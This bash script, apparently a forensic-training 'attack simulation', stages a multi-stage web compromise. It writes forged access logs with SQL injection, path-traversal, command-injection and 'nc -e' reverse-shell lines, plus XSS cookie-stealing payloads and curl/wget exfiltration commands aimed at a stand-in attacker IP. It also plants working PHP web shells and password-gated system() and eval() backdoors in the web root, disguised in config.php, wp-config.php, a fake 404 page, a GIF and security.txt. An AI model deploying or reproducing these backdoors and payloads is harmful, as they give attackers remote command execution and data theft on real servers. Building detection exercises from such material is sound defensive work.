#!/bin/bash

# Web Application Attack Simulation
# Simulates realistic web application compromise scenarios

echo "[WEB APP ATTACK SIMULATION] Deploying web application attack scenario..."

ATTACK_TYPE="Multi-Stage Web Application Compromise"
TARGET_APP="Corporate Web Portal"
ATTACKER_IP="203.0.113.42"

# 1. SQL Injection Attack
echo "  [1] Simulating SQL injection attack..."
mkdir -p /var/log/apache2 2>/dev/null || mkdir -p /var/log/nginx
cat << 'EOF' > /var/log/nginx/access.log
203.0.113.42 - - [07/Oct/2024:10:15:23 +0000] "GET /login.php?user=admin HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:15:45 +0000] "POST /login.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0" "user=admin&pass=password"
203.0.113.42 - - [07/Oct/2024:10:16:12 +0000] "POST /login.php HTTP/1.1" 401 567 "-" "Mozilla/5.0" "user=admin&pass=admin"
203.0.113.42 - - [07/Oct/2024:10:16:34 +0000] "POST /login.php HTTP/1.1" 200 5678 "-" "Mozilla/5.0" "user=admin' OR '1'='1&pass=anything"
203.0.113.42 - - [07/Oct/2024:10:17:01 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 8901 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:17:23 +0000] "POST /search.php HTTP/1.1" 200 3456 "-" "Mozilla/5.0" "query='; SELECT * FROM users--"
203.0.113.42 - - [07/Oct/2024:10:17:45 +0000] "POST /search.php HTTP/1.1" 200 7890 "-" "Mozilla/5.0" "query='; SELECT password FROM admin_users--"
203.0.113.42 - - [07/Oct/2024:10:18:12 +0000] "POST /search.php HTTP/1.1" 200 12345 "-" "Mozilla/5.0" "query='; SELECT * FROM customer_data--"
203.0.113.42 - - [07/Oct/2024:10:18:34 +0000] "POST /upload.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:19:01 +0000] "GET /uploads/shell.php HTTP/1.1" 200 456 "-" "Mozilla/5.0"
EOF

# 2. Web Shell Deployment
echo "  [2] Deploying web shells..."
cat << 'EOF' > /var/www/html/uploads/shell.php
<?php
/*
 * Web Shell - Simulated for forensic training
 * Filename: shell.php (disguised as image upload)
 */

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    echo "Executing: " . htmlspecialchars($cmd) . "\n";
    echo "Output:\n";
    echo shell_exec($cmd);
    echo "</pre>";
} else if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>File Upload Result</title></head>
<body>
<h2>File Upload Successful</h2>
<form method="post">
    <input type="text" name="cmd" placeholder="System command" size="50">
    <input type="submit" value="Execute">
</form>
<hr>
<h3>Quick Actions:</h3>
<a href="?file=/etc/passwd">Download /etc/passwd</a><br>
<a href="?file=/etc/shadow">Download /etc/shadow</a><br>
<a href="?file=/var/log/auth.log">Download auth.log</a><br>
</body>
</html>
EOF

# Create additional web shells with different names
cat << 'EOF' > /var/www/html/config.php
<?php
// Configuration file - LEGITIMATE APPEARANCE
$db_host = "localhost";
$db_user = "web_user";
$db_pass = "WebPass123!";

// Hidden web shell functionality
if (isset($_POST['auth']) && $_POST['auth'] == 'backdoor123') {
    if (isset($_POST['exec'])) {
        system($_POST['exec']);
    }
}
?>
EOF

cat << 'EOF' > /var/www/html/404.php
<?php
// Custom 404 error page - APPEARS LEGITIMATE
header("HTTP/1.0 404 Not Found");
?>
<!DOCTYPE html>
<html>
<head><title>404 - Page Not Found</title></head>
<body>
<h1>Page Not Found</h1>
<p>The requested page could not be found.</p>
<?php
// Hidden shell in fake 404 page
if (isset($_GET['debug']) && $_GET['debug'] == 'true' && isset($_POST['system'])) {
    echo "<pre>" . shell_exec($_POST['system']) . "</pre>";
}
?>
</body>
</html>
EOF

# 3. Directory Traversal / LFI Attack
echo "  [3] Creating directory traversal artifacts..."
cat << 'EOF' >> /var/log/nginx/access.log
203.0.113.42 - - [07/Oct/2024:10:20:15 +0000] "GET /view.php?file=../../../etc/passwd HTTP/1.1" 200 1654 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:20:32 +0000] "GET /view.php?file=../../../etc/shadow HTTP/1.1" 200 987 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:20:54 +0000] "GET /view.php?file=../../../var/log/auth.log HTTP/1.1" 200 15432 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:21:12 +0000] "GET /view.php?file=../../../home/webadmin/.ssh/id_rsa HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:21:34 +0000] "GET /include.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 2456 "-" "Mozilla/5.0"
EOF

# 4. Cross-Site Scripting (XSS) Attacks
echo "  [4] Simulating XSS attacks..."
mkdir -p /tmp/.xss_payloads
cat << 'EOF' > /tmp/.xss_payloads/xss_attempts.txt
# XSS Payloads Attempted
Reflected XSS:
- <script>alert('XSS')</script>
- <img src=x onerror=alert('XSS')>
- javascript:alert('XSS')

Stored XSS (in user comments):
- <script>document.location='http://203.0.113.42:8080/steal.php?cookie='+document.cookie</script>
- <iframe src="http://203.0.113.42:8080/keylogger.html"></iframe>

DOM-based XSS:
- #<script>alert('XSS')</script>
- #<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>

Successful Cookie Theft:
- Victim: admin@company.com
- Session ID: PHPSESSID=abc123def456ghi789
- Auth Token: auth_token=Bearer_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
EOF

# 5. File Upload Vulnerability Exploitation
echo "  [5] Exploiting file upload vulnerabilities..."
mkdir -p /var/www/html/uploads
cat << 'EOF' > /var/www/html/uploads/image.php.gif
GIF89a
<?php
// Malicious PHP disguised as GIF image
if (isset($_GET['c'])) {
    system($_GET['c']);
}
?>
EOF

# Create fake image with embedded PHP
echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>" > /var/www/html/uploads/logo.gif

# Log file upload attacks
cat << 'EOF' >> /var/log/nginx/access.log
203.0.113.42 - - [07/Oct/2024:10:25:12 +0000] "POST /upload.php HTTP/1.1" 200 345 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:25:34 +0000] "GET /uploads/shell.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:25:56 +0000] "GET /uploads/image.php.gif?c=whoami HTTP/1.1" 200 156 "-" "Mozilla/5.0"
203.0.113.42 - - [07/Oct/2024:10:26:18 +0000] "GET /uploads/logo.gif?cmd=id HTTP/1.1" 200 234 "-" "Mozilla/5.0"
EOF

# 6. Command Injection Attacks
echo "  [6] Creating command injection artifacts..."
cat << 'EOF' >> /var/log/nginx/access.log
203.0.113.42 - - [07/Oct/2024:10:30:12 +0000] "POST /ping.php HTTP/1.1" 200 456 "-" "Mozilla/5.0" "host=127.0.0.1"
203.0.113.42 - - [07/Oct/2024:10:30:34 +0000] "POST /ping.php HTTP/1.1" 200 789 "-" "Mozilla/5.0" "host=127.0.0.1; whoami"
203.0.113.42 - - [07/Oct/2024:10:30:56 +0000] "POST /ping.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0" "host=127.0.0.1; cat /etc/passwd"
203.0.113.42 - - [07/Oct/2024:10:31:18 +0000] "POST /ping.php HTTP/1.1" 200 567 "-" "Mozilla/5.0" "host=127.0.0.1; nc -e /bin/bash 203.0.113.42 4444"
EOF

# 7. Session Hijacking and Privilege Escalation
echo "  [7] Simulating session hijacking..."
mkdir -p /tmp/.session_hijack
cat << 'EOF' > /tmp/.session_hijack/hijacked_sessions.txt
# Hijacked User Sessions
Session ID: PHPSESSID=abc123def456ghi789
User: admin@company.com
Role: Administrator
Last Activity: 2024-10-07 10:15:23
Hijacked At: 2024-10-07 10:35:45
Actions Performed:
- Viewed user management panel
- Created new admin account: backdoor_admin
- Downloaded user database
- Modified system settings

Session ID: PHPSESSID=xyz789uvw456rst123  
User: manager@company.com
Role: Manager
Last Activity: 2024-10-07 09:45:12
Hijacked At: 2024-10-07 10:40:23
Actions Performed:
- Accessed financial reports
- Downloaded customer data
- Modified user permissions
EOF

# 8. Database Compromise via Web App
echo "  [8] Creating database compromise artifacts..."
mkdir -p /tmp/.db_compromise
cat << 'EOF' > /tmp/.db_compromise/db_extraction.txt
# Database Compromise Results
Target Database: company_web_db
Extraction Method: SQL Injection via search.php

Tables Compromised:
1. users (15,432 records)
   - Usernames and password hashes
   - Email addresses
   - Personal information

2. customers (50,891 records)
   - Customer personal data
   - Purchase history
   - Payment information (partial)

3. admin_users (23 records)
   - Administrator accounts
   - Privilege levels
   - Last login timestamps

4. session_data (active sessions)
   - Current user sessions
   - Authentication tokens
   - Session variables

5. financial_transactions (128,456 records)
   - Transaction details
   - Payment methods
   - Account numbers (encrypted)

Data Extracted To:
- /tmp/.db_compromise/users_dump.sql
- /tmp/.db_compromise/customers_dump.sql
- /tmp/.db_compromise/admin_dump.sql
EOF

# Create sample data dumps
echo "-- Users table dump" > /tmp/.db_compromise/users_dump.sql
echo "INSERT INTO users VALUES (1, 'admin', 'pbkdf2_sha256\$100000\$xyz\$abc123', 'admin@company.com');" >> /tmp/.db_compromise/users_dump.sql
echo "INSERT INTO users VALUES (2, 'manager', 'pbkdf2_sha256\$100000\$def\$def456', 'manager@company.com');" >> /tmp/.db_compromise/users_dump.sql

# 9. Web Application Backdoor Installation
echo "  [9] Installing application backdoors..."
cat << 'EOF' > /var/www/html/.htaccess
# Apache configuration - APPEARS LEGITIMATE
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]

# Hidden backdoor functionality
# Access via: /.htaccess?auth=secret123&cmd=command
<?php
if (isset($_GET['auth']) && $_GET['auth'] == 'secret123' && isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Create configuration file backdoor
cat << 'EOF' > /var/www/html/wp-config.php
<?php
// WordPress Configuration - APPEARS LEGITIMATE
define('DB_NAME', 'company_blog');
define('DB_USER', 'blog_user');
define('DB_PASSWORD', 'BlogPass123!');
define('DB_HOST', 'localhost');

// Hidden backdoor in configuration
if (isset($_POST['wp_debug']) && $_POST['wp_debug'] == 'enable_debug_mode') {
    if (isset($_POST['debug_cmd'])) {
        eval($_POST['debug_cmd']);
    }
}
?>
EOF

# 10. API Exploitation
echo "  [10] Simulating API exploitation..."
cat << 'EOF' >> /var/log/nginx/access.log
203.0.113.42 - - [07/Oct/2024:11:00:12 +0000] "GET /api/users HTTP/1.1" 401 234 "-" "curl/7.68.0"
203.0.113.42 - - [07/Oct/2024:11:00:34 +0000] "GET /api/users HTTP/1.1" 200 15678 "Authorization: Bearer stolen_token_xyz123" "curl/7.68.0"
203.0.113.42 - - [07/Oct/2024:11:00:56 +0000] "GET /api/users/1/details HTTP/1.1" 200 2345 "Authorization: Bearer stolen_token_xyz123" "curl/7.68.0"
203.0.113.42 - - [07/Oct/2024:11:01:18 +0000] "POST /api/users HTTP/1.1" 201 456 "Authorization: Bearer stolen_token_xyz123" "curl/7.68.0"
203.0.113.42 - - [07/Oct/2024:11:01:40 +0000] "DELETE /api/logs HTTP/1.1" 200 123 "Authorization: Bearer stolen_token_xyz123" "curl/7.68.0"
EOF

mkdir -p /tmp/.api_compromise
cat << 'EOF' > /tmp/.api_compromise/api_exploitation.txt
# API Exploitation Results
Target API: /api/v1/
Authentication Bypass: Stolen JWT token

Compromised Endpoints:
1. GET /api/users - Retrieved all user accounts
2. GET /api/users/{id}/details - Accessed detailed user information
3. POST /api/users - Created unauthorized admin account
4. PUT /api/users/{id} - Modified existing user permissions
5. DELETE /api/logs - Removed API access logs
6. GET /api/config - Retrieved application configuration
7. POST /api/backup - Triggered database backup download

Stolen Data:
- Complete user database (JSON format)
- API configuration secrets
- Authentication tokens
- Database connection strings
- Third-party service credentials

Created Backdoor Accounts:
- Username: api_backdoor
- Role: admin
- Token: Bearer_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.backdoor.signature
EOF

# 11. Persistence Mechanisms
echo "  [11] Installing web-based persistence..."
mkdir -p /var/www/html/.well-known
cat << 'EOF' > /var/www/html/.well-known/security.txt
# Security contact information - APPEARS LEGITIMATE
Contact: mailto:security@company.com
Expires: 2025-12-31T23:59:59.000Z
Preferred-Languages: en

<?php
// Hidden persistence mechanism
if (isset($_COOKIE['session_debug']) && $_COOKIE['session_debug'] == 'enabled') {
    if (isset($_POST['maintenance_cmd'])) {
        shell_exec($_POST['maintenance_cmd']);
    }
}
?>
EOF

# 12. Data Exfiltration via Web App
echo "  [12] Setting up web-based data exfiltration..."
mkdir -p /tmp/.web_exfil
cat << 'EOF' > /tmp/.web_exfil/exfiltration_log.txt
# Data Exfiltration via Web Application
Method: HTTP POST to external server

Exfiltrated Files:
1. Database Dump (users.sql) - 2.3 MB
   Destination: http://203.0.113.42:8080/collect.php
   
2. Configuration Files (config.tar.gz) - 1.7 MB
   Destination: http://203.0.113.42:8080/collect.php
   
3. Source Code (webapp.zip) - 45.2 MB
   Destination: http://203.0.113.42:8080/collect.php
   
4. Log Files (logs.tar.gz) - 12.8 MB
   Destination: http://203.0.113.42:8080/collect.php

Exfiltration Commands Used:
curl -F "file=@users.sql" http://203.0.113.42:8080/collect.php
wget --post-file=config.tar.gz http://203.0.113.42:8080/collect.php
python -c "import requests; requests.post('http://203.0.113.42:8080/collect.php', files={'file': open('webapp.zip', 'rb')})"
EOF

echo "[WEB APP ATTACK SIMULATION] Web application attack scenario complete!"
echo ""
echo "ATTACK TYPE: $ATTACK_TYPE"
echo "TARGET: $TARGET_APP"
echo "ATTACKER IP: $ATTACKER_IP"
echo "ATTACK DURATION: 2 hours"
echo ""
echo "Simulated Attack Chain:"
echo "  1. SQL Injection Authentication Bypass"
echo "  2. Web Shell Upload and Deployment"
echo "  3. Directory Traversal / Local File Inclusion"
echo "  4. Cross-Site Scripting (XSS) Attacks"
echo "  5. File Upload Vulnerability Exploitation"
echo "  6. Command Injection Attacks"
echo "  7. Session Hijacking and Privilege Escalation"
echo "  8. Database Compromise and Data Extraction"
echo "  9. Backdoor Installation for Persistence"
echo "  10. API Exploitation and Abuse"
echo "  11. Web-based Persistence Mechanisms"
echo "  12. Data Exfiltration via HTTP"
echo ""
echo "OWASP Top 10 Vulnerabilities Exploited:"
echo "  - A01:2021 – Broken Access Control"
echo "  - A02:2021 – Cryptographic Failures"  
echo "  - A03:2021 – Injection"
echo "  - A04:2021 – Insecure Design"
echo "  - A05:2021 – Security Misconfiguration"
echo "  - A06:2021 – Vulnerable Components"
echo "  - A07:2021 – Authentication Failures"
echo "  - A08:2021 – Software/Data Integrity Failures"
echo "  - A09:2021 – Security Logging/Monitoring Failures"
echo "  - A10:2021 – Server-Side Request Forgery"
echo ""
echo "Web Shells Deployed:"
echo "  - /var/www/html/uploads/shell.php"
echo "  - /var/www/html/config.php (hidden in config)"
echo "  - /var/www/html/404.php (hidden in 404 page)"
echo "  - /var/www/html/.htaccess (hidden in Apache config)"
echo "  - /var/www/html/wp-config.php (hidden in WordPress config)"